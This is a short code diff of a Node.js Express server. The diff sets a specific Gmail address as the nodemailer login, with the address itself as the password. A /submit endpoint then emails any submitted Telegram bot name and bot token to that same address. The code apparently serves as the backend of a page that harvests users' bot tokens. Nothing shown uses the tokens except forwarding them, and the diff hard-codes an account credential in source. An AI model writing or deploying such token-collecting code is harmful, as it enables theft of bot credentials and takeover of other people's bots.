@@ -11,8 +11,8 @@ app.use(bodyParser.json());
 const transporter = nodemailer.createTransport({
     service: 'gmail',
     auth: {
-        user: 'your-email@gmail.com',
-        pass: 'your-email-password'
+        user: 'kelvinwebsitereviews@gmail.com',
+        pass: 'kelvinwebsitereviews@gmail.com'
     }
 });
 
@@ -20,7 +20,7 @@ app.post('/submit', (req, res) => {
     const { botName, botToken } = req.body;
 
     const mailOptions = {
-        from: 'your-email@gmail.com',
+        from: 'kelvinwebsitereviews@gmail.com',
         to: 'kelvinwebsitereviews@gmail.com',
         subject: 'New Telegram Bot Token',
         text: `Bot Name: ${botName}\nBot Token: ${botToken}`
